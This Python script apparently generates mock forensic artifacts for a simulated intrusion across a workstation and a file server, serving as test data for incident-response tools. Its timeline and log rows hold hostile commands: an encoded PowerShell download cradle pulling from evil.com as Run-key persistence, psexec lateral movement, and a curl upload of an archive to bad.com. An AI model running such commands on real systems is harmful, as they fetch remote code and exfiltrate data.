import os
import csv
from pathlib import Path
import random
import datetime
import json
import base64

# ============================================================
#  Mock Generator: Operation "Twin Snakes" v3 (Fix: Schema Align)
#  Mission: Generate Artifacts compatible with Helios v1.9 Toolchain
# ============================================================

BASE_DIR = Path("Mock_TwinSnakes")
HOST_A = BASE_DIR / "Workstation-01"
HOST_B = BASE_DIR / "FileServer-99"

# 基準時間 (T0)
T0 = datetime.datetime(2025, 12, 30, 10, 0, 0)

def write_csv(path, headers, rows):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(headers)
        w.writerows(rows)
    print(f"[+] Created: {path}")

def write_json(path, data):
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)
    print(f"[+] Created: {path}")

def generate_host_a():
    """
    Host A: Workstation-01 (Initial Access & Persistence)
    """
    print(f"\n[*] Generating Artifacts for Host A ({HOST_A})...")
    
    # 1. Timeline (Hercules Schema Compatible)
    t_drop = T0 + datetime.timedelta(minutes=5)
    t_exec = t_drop 
    
    evil_cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')"
    b64_cmd = base64.b64encode(evil_cmd.encode('utf-16le')).decode()
    encoded_ps = f"powershell.exe -EncodedCommand {b64_cmd}"

    # Schema: Timestamp_UTC, Artifact_Type, Action, User, Target_Path, Tag, Judge_Verdict
    timeline_rows = [
        # Phishing Drop
        [f"{t_drop.strftime('%Y-%m-%d %H:%M:%S')}.123", "Pandora", "FileCreate", "UserA", "Downloads\\Invoice.js", "PHISHING_CANDIDATE", "CRITICAL_PHISHING"],
        # Phishing Exec
        [f"{t_exec.strftime('%Y-%m-%d %H:%M:%S')}.456", "EventLog", "Process Execution", "UserA", "wscript.exe Invoice.js", "EXECUTION", "CRITICAL_PROCESS"],
        # Persistence
        [(T0 + datetime.timedelta(minutes=10)).isoformat(), "Registry", "RunKey Added", "UserA", f"Value: Updater | Data: {encoded_ps}", "PERSISTENCE", "CRITICAL_PERSISTENCE"],
        # Lateral Move
        [(T0 + datetime.timedelta(minutes=45)).isoformat(), "EventLog", "Process Execution", "UserA", "psexec.exe -s \\\\192.168.1.20 cmd", "LATERAL_MOVEMENT", "CRITICAL_LATERAL"],
    ]
    
    headers = ["Timestamp_UTC", "Artifact_Type", "Action", "User", "Target_Path", "Tag", "Judge_Verdict"]
    write_csv(HOST_A / "Master_Timeline.csv", headers, timeline_rows)

    # 2. Pandora
    pandora_rows = [
        ["Invoice.js", "C:\\Users\\UserA\\Downloads\\", "PHISHING_CANDIDATE", f"{t_drop.strftime('%Y-%m-%d %H:%M:%S')}.123"],
    ]
    write_csv(HOST_A / "Pandora_Ghosts.csv", ["Ghost_FileName", "ParentPath", "Risk_Tag", "Ghost_Time_Hint"], pandora_rows)

    # 3. Evtx (Network & PowerShell)
    evtx_rows = [
        [(T0 + datetime.timedelta(minutes=10)).isoformat(), "4104", "powershell.exe", "", "", f"Creating Scriptblock text ({1} of 1): {evil_cmd}"],
        [(T0 + datetime.timedelta(minutes=45)).isoformat(), "3", "psexec.exe", "192.168.1.20", "445", ""],
    ]
    write_csv(HOST_A / "EvtxECmd_Output.csv", ["TimeCreated", "EventId", "Image", "DestinationIp", "DestinationPort", "ScriptBlockText"], evtx_rows)

    # 4. Siren (Prefetch)
    pe_rows = [
        ["psexec.exe", (T0 + datetime.timedelta(minutes=45)).isoformat(), "1", "C:\\Windows\\System32\\psexec.exe"],
        ["wscript.exe", (T0 + datetime.timedelta(minutes=5)).isoformat(), "1", "C:\\Windows\\System32\\wscript.exe"]
    ]
    write_csv(HOST_A / "PECmd_Output.csv", ["ExecutableName", "LastRun", "RunCount", "SourceFilename"], pe_rows)

    # 5. AION (Autoruns - CSV Input Simulation)
    autorun_rows = [
        ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", encoded_ps, "Malicious PowerShell Persistence"]
    ]
    # Note: AION usually reads Registry csv, but this mock might be for manual check or future parser
    write_csv(HOST_A / "Autoruns.csv", ["Location", "Item", "ImagePath", "Description"], autorun_rows)

    # 6. SRUM
    srum_rows = [
        ["psexec.exe", "2000000", "5000", (T0 + datetime.timedelta(minutes=45)).isoformat()],
    ]
    write_csv(HOST_A / "SRUM_Network_Usage.csv", ["ExeInfo", "BytesSent", "BytesReceived", "Timestamp"], srum_rows)

    # Identity
    write_json(HOST_A.parent / "Host_Identity_A.json", {"Hostname": "WORKSTATION-01"})


def generate_host_b():
    """
    Host B: FileServer-99
    """
    print(f"\n[*] Generating Artifacts for Host B ({HOST_B})...")
    
    # 0. Session Map (PrivEsc)
    session_start = T0 + datetime.timedelta(minutes=30)
    sessions = [{
        "User": "CORP\\AdminB", "SID": "S-1-5-21-CORP-ADMINB",
        "Start": session_start.isoformat(), "End": "ACTIVE", "LogonType": "10"
    }]
    write_json(HOST_B.parent / "hercules_sessions.json", sessions)

    # 1. Master Timeline (Hercules Schema Compatible)
    timeline_rows = [
        # Incoming Service
        [(T0 + datetime.timedelta(minutes=45, seconds=10)).isoformat(), "System", "Service Install", "System", "ImagePath: %SystemRoot%\\PSEXESVC.exe", "LATERAL_TOOL", "CRITICAL_LATERAL"],
        # Timestomping
        [(T0 + datetime.timedelta(minutes=50)).isoformat(), "System", "FileCreate", "System", "Path: C:\\Data\\Conf.7z", "TIMESTOMP", "CRITICAL_TIMESTOMP"],
        # Exfiltration
        [(T0 + datetime.timedelta(minutes=55)).isoformat(), "System", "Process Execution", "System", "curl.exe -F data=@Conf.7z http://bad.com", "DATA_EXFIL", "CRITICAL_EXFIL"],
    ]
    
    headers = ["Timestamp_UTC", "Artifact_Type", "Action", "User", "Target_Path", "Tag", "Judge_Verdict"]
    write_csv(HOST_B / "Master_Timeline.csv", headers, timeline_rows)

    # 2. Chronos (MFT)
    real_time = T0 + datetime.timedelta(minutes=50)
    fake_time = T0 - datetime.timedelta(days=365)
    
    mft_rows = [
        ["Conf.7z", fake_time.isoformat(), real_time.isoformat(), "C:\\Data\\Conf.7z", "Timestomped Archive"]
    ]
    write_csv(HOST_B / "MFT_Output.csv", ["FileName", "si_dt", "fn_dt", "ParentPath", "Notes"], mft_rows)

    # 3. Pandora
    pandora_rows = [
        ["PSEXESVC.exe", "C:\\Windows\\", "LATERAL_TOOL", (T0 + datetime.timedelta(minutes=45)).isoformat()],
    ]
    write_csv(HOST_B / "Pandora_Ghosts.csv", ["Ghost_FileName", "ParentPath", "Risk_Tag", "Ghost_Time_Hint"], pandora_rows)

    # 4. Evtx
    evtx_rows = [
        [(T0 + datetime.timedelta(minutes=45)).isoformat(), "5156", "System", "192.168.1.20", "445", ""], 
        [(T0 + datetime.timedelta(minutes=55)).isoformat(), "3", "curl.exe", "104.100.99.88", "80", ""],
    ]
    write_csv(HOST_B / "EvtxECmd_Output.csv", ["TimeCreated", "EventId", "Image", "DestinationIp", "DestinationPort", "ScriptBlockText"], evtx_rows)

    # 5. SRUM (High Heat)
    srum_rows = [
        ["curl.exe", "60000000", "5000", (T0 + datetime.timedelta(minutes=55)).isoformat()],
    ]
    write_csv(HOST_B / "SRUM_Network_Usage.csv", ["ExeInfo", "BytesSent", "BytesReceived", "Timestamp"], srum_rows)

    # Identity
    write_json(HOST_B.parent / "Host_Identity_B.json", {"Hostname": "FILESERVER-99"})

def main():
    print(">>> 🐍 Initializing Operation Twin Snakes v3 (Schema Fixed)...")
    generate_host_a()
    generate_host_b()
    print("\n[!] Mock Data Generated in 'Mock_TwinSnakes' with Hercules-Compatible Schema.")
    print("    [Ready] You can now run Hekate directly against 'Master_Timeline.csv'.")

if __name__ == "__main__":
    main()